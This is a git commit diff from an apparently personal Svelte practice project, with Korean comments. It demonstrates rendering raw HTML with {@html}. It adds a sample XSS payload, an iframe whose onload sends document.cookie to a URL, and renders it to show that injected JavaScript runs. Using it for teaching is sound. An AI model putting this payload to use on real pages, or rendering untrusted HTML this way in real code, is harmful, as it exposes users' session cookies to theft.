c4ea8b685c3652d676bdd4ccd8489ed686cc9840
thebluerat <riato101@naver.com>
2022-12-14 15:35:04 +0900

    Svelte에 원시 HTML 작성하기

--- svelte-test/src/App.svelte
+++ svelte-test/src/App.svelte
@@ -1,18 +1,12 @@
-<!-- 보간법 -->
+<!-- Svelte에 원시 HTML 작성하기 -->
 
 <script>
-    let href = 'https://ttoobi.blog'
-    let name = 'ttoobi' 
-    let value = 'New input value!'
-    let isUpperCase = false
+    let h1 = '<h1>Hello ttoobi</h1>'
+    let xss = '<iframe onload="document.location=`https://?${document.cookie}`"></iframe>'
+
+    // 외부에서 작성한 자바스크립트가 실행될 수 있다
 </script>
 
-<!-- <a href = "https://ttoobi.blog">ttoobi</a> -->
-<a {href}>{name}</a>
-<!-- 단방향 데이터에서는 속성과 데이터 이름이 같으면 속성을 생략할 수 있다 -->
-
-<!-- <input type = "text" value = "Default value"/> -->
-<input {value} on:input={e => value = e.target.value} />
-<!-- 화살표 함수는 인수가 하나이면 소괄호와 뒤의 중괄호를 생략할 수 있다. -->
-<input bind:value />
-<!-- 양방향 데이터는 속성과 데이터 이름이 같으면 데이터를 생략한다. -->
+{@html h1}
+<!-- at-sign html을 넣어서 html로 해석할 수 있게 보간 -->
+{@html xss}
